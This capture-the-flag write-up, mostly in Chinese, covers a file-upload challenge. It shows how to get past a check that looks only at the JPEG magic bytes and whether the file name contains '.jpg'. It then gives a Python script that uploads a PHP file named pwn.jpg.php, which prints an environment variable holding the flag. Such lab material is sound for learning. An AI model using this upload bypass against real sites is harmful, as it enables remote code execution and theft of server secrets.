# X-067-24 Medium file Upload

> Upload your image file to this image storage web site. We have improved the security to verify the file structure and the extension of uploaded files. Hint: Check environment variables.

页面提供图片上传功能，提示仅支持 JPG。上传成功后页面会返回一个到 `upload/<文件名>` 的链接。

常见“只校验前两个字节是否为 JPEG 魔术字节 FF D8”，以及“扩展名仅做包含判断而非后缀严格判断”。于是可以构造一个“前两字节为 `0xFF 0xD8` 的 PHP 脚本”，并命名为 `xxx.jpg.php`：

- 以 FF D8 开头可骗过“文件头校验”。
- 名称里包含 `.jpg` 可骗过“扩展名包含 JPG 的弱校验”。
- 最终后缀仍为 `.php`，被服务器当作 PHP 执行。

结合题目描述里的提示“环境变量”，上传的 PHP 里直接 `echo getenv('FLAG')` 即可输出 flag。

构造的 `pwn.jpg.php` 如下：
![image.png](https://x/x12111452419.png)
上传后访问 `http://ip32829/upload/pwn.jpg.php`：
![image.png](https://x/x12111547889.png)
## EXP
```python
import requests

url = "http://ip32829/index.php"

payload = b"\xff\xd8<?php echo getenv('FLAG'); ?>"
files = {
    'userfile': ('pwn.jpg.php', payload, 'image/jpeg')
}

data = {
    'submit': 'Upload Image'
}

r = requests.post(url, files=files, data=data)
print('[*] Upload response length:', len(r.text))

flag_url = "http://ip32829/upload/pwn.jpg.php"
flag = requests.get(flag_url).text
print('[*] Flag page content:', flag)
```